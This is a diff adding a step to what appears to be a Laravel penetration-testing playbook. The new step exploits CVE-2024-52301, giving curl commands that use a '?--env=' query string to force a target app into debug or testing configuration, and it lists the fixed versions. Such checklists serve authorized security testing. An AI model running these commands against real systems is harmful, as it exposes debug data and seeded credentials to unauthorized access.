@@ -116,6 +116,14 @@ curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "except
 
 ---
 
+## Phase 4b — Environment override via query args (CVE-2024-52301)
+When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
+```bash
+curl -s "https://$TARGET/?--env=local"          # force debug/local config
+curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config
+# Confirm: debug/Whoops page or a different env banner. Fixed 11.31.0 / 10.48.23 / 9.52.17.
+```
+
 ## Phase 5 — Signed URL Manipulation
 
 ```bash
